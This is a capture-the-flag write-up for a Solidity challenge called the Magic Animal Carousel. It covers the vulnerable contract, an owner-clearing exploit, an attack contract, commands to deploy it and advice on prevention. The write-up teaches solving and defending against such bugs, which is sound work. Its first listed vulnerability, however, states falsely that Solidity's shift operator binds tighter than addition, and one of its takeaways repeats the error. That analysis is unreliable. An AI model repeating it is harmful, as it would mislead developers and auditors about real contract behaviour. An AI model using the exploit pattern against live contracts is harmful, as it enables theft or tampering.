# Level 33: Magic Animal Carousel Challenge

## Challenge Description

Welcome, dear Anon, to the Magic Carousel, where creatures spin and twirl in a boundless spell. In this magical, infinite digital wheel, they loop and whirl with enchanting zeal.

Add a creature to join the fun, but heed the rule, or the game's undone. If an animal joins the ride, take care when you check again, that same animal must be there!

**Goal:** Break the magic rule of the carousel - make an animal change or disappear after it has joined the ride.

## Contract Location

The challenge contracts are located at:
```
/contracts/level-33-magic-animal/MagicAnimalCarousel.sol
```

## Understanding the Challenge

### The MagicAnimalCarousel Contract

```solidity
contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        uint256 crate = carousel[crateId];
        require(crate != 0, CrateNotInitialized());
        
        address owner = address(uint160(crate & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

### Storage Layout

Each crate in the carousel mapping stores a 256-bit value:

```
┌────────────────────────────────────────────────────────────────┐
│  Bits [0-159]:   Owner address (160 bits)                      │
│  Bits [160-175]: NextId - pointer to next crate (16 bits)      │
│  Bits [176-255]: Animal name encoded (80 bits intended)        │
└────────────────────────────────────────────────────────────────┘
```

### Key Components

1. **MAX_CAPACITY**: Maximum number of crates (65535)
2. **ANIMAL_MASK**: Intended to mask animal bits at [176-255]
3. **NEXT_ID_MASK**: Masks nextId bits at [160-175]
4. **OWNER_MASK**: Masks owner bits at [0-159]
5. **currentCrateId**: Points to the current position in the carousel
6. **carousel mapping**: Stores encoded data for each crate

## The Vulnerabilities

### 1. Operator Precedence Bug

The most critical bug is in how the contract uses bit shifts:

```solidity
// In setAnimalAndSpin:
encodedAnimal << 160 + 16

// In ANIMAL_MASK:
uint256(type(uint80).max) << 160 + 16
```

**The Problem:**
- In Solidity, `<<` has higher precedence than `+`
- `a << 160 + 16` evaluates as `(a << 160) + 16`, NOT `a << 176`
- This places the animal in bits [160-255] instead of [176-255]
- The animal bits OVERLAP with the nextId position!

```
Expected:  a << 176        → Animal at bits [176-255]
Actual:    (a << 160) + 16 → Animal at bits [160-255] + garbage
```

### 2. Encoding Inconsistency

The two functions encode animal names differently:

```solidity
// setAnimalAndSpin applies EXTRA >> 16:
uint256 encodedAnimal = encodeAnimalName(animal) >> 16;

// changeAnimal does NOT apply >> 16:
uint256 encodedAnimal = encodeAnimalName(animal);
```

This means:
- Same animal name → Different encoded values
- An animal added via `setAnimalAndSpin` will look different than one set via `changeAnimal`

### 3. Owner Bypass Vulnerability

```solidity
function changeAnimal(string calldata animal, uint256 crateId) external {
    address owner = address(uint160(crate & OWNER_MASK));
    if (owner != address(0)) {
        require(msg.sender == owner);
    }
    // ...
    if (encodedAnimal != 0) {
        // Replace animal
    } else {
        // CLEARS THE OWNER!
        carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
```

**The Attack Vector:**
1. Call `changeAnimal("", crateId)` with an empty string
2. `encodedAnimal` will be 0
3. The else branch executes, clearing the owner slot
4. Now ANYONE can call `changeAnimal` on that crate!

### 4. NextId Manipulation

For 12-character animal names:
- `encodeAnimalName` returns up to 96 bits
- When shifted left 160 bits in `changeAnimal`: bits [0-15] of encoded animal end up at [160-175]
- These bits OR with the existing nextId
- Result: Corrupted nextId, potentially creating loops or jumps in the carousel

## The Exploit

### Step 1: Add an Animal

```javascript
await carousel.setAnimalAndSpin("Dog");
const crateId = await carousel.currentCrateId();
// Dog is now in the carousel, owned by us
```

### Step 2: Clear the Owner

```javascript
await carousel.changeAnimal("", crateId);
// Owner is now address(0), anyone can modify!
```

### Step 3: Change the Animal

```javascript
await carousel.changeAnimal("Cat", crateId);
// Dog is gone, Cat is now there
// Rule broken: same animal is NOT there!
```

## Solution Contract

```solidity
contract MagicAnimalCarouselAttack {
    IMagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
    }
    
    function attack(string calldata originalAnimal, string calldata newAnimal) external {
        // Step 1: Add the original animal
        target.setAnimalAndSpin(originalAnimal);
        uint256 crateId = target.currentCrateId();
        
        // Step 2: Clear the owner
        target.changeAnimal("", crateId);
        
        // Step 3: Change the animal
        target.changeAnimal(newAnimal, crateId);
        
        // Original animal is gone - rule broken!
    }
}
```

## Running the Exploit

### Deploy the Attack Contract

```bash
CAROUSEL_ADDRESS=0xYourCarousel npx hardhat deploy --tags magic-animal-carousel-solution --network sepolia
```

### Execute the Attack

```bash
CAROUSEL_ADDRESS=0xYourCarousel \
npx hardhat run scripts/level-33-magic-animal-carousel/attack.ts --network sepolia
```

## How to Prevent These Vulnerabilities

### 1. Use Parentheses for Operator Precedence

```solidity
// WRONG - relies on precedence
encodedAnimal << 160 + 16

// CORRECT - explicit order
encodedAnimal << (160 + 16)
```

### 2. Consistent Encoding

```solidity
// Use the same encoding in both functions
function _encodeAnimal(string calldata animal) internal pure returns (uint256) {
    return encodeAnimalName(animal) >> 16;  // Always apply the same shift
}

function setAnimalAndSpin(string calldata animal) external {
    uint256 encodedAnimal = _encodeAnimal(animal);
    // ...
}

function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 encodedAnimal = _encodeAnimal(animal);  // Same encoding!
    // ...
}
```

### 3. Proper Access Control

```solidity
function changeAnimal(string calldata animal, uint256 crateId) external {
    // Don't allow clearing owner without authorization
    require(bytes(animal).length > 0, "Animal name required");
    
    // Or require explicit owner approval for clearing
    if (encodedAnimal == 0) {
        require(msg.sender == owner, "Only owner can clear");
    }
}
```

### 4. Validate Bit Operations

```solidity
// Ensure encoded value doesn't overflow into other fields
require(encodedAnimal <= type(uint80).max, "Animal too large");
require((encodedAnimal << 176) >> 176 == encodedAnimal, "Overflow detected");
```

## Key Takeaways

1. **Operator Precedence is Tricky**: Always use parentheses when combining shift (`<<`, `>>`) and arithmetic (`+`, `-`) operators. `a << b + c` is `(a << b) + c`, not `a << (b + c)`.

2. **Consistency is Critical**: When multiple functions modify the same data structure, they must use identical encoding/decoding logic. Even small differences can break invariants.

3. **Access Control Must Be Complete**: If a function can modify ownership or permissions, ensure all paths require proper authorization. The "clear owner" path should not be a backdoor.

4. **Bit Packing Requires Careful Masking**: When packing multiple values into a single uint256, ensure operations don't accidentally modify adjacent fields.

5. **Test Edge Cases**: Empty strings, maximum length inputs, and boundary values often reveal bugs that normal inputs miss.

## References

- [Solidity Operator Precedence](https://docs.soliditylang.org/en/latest/types.html#order-of-precedence-of-operators)
- [Bit Manipulation in Solidity](https://ethereum.stackexchange.com/questions/98693/understanding-bitwise-operations-in-solidity)
- [Storage Layout and Packing](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
- [Access Control Best Practices](https://docs.openzeppelin.com/contracts/4.x/access-control)
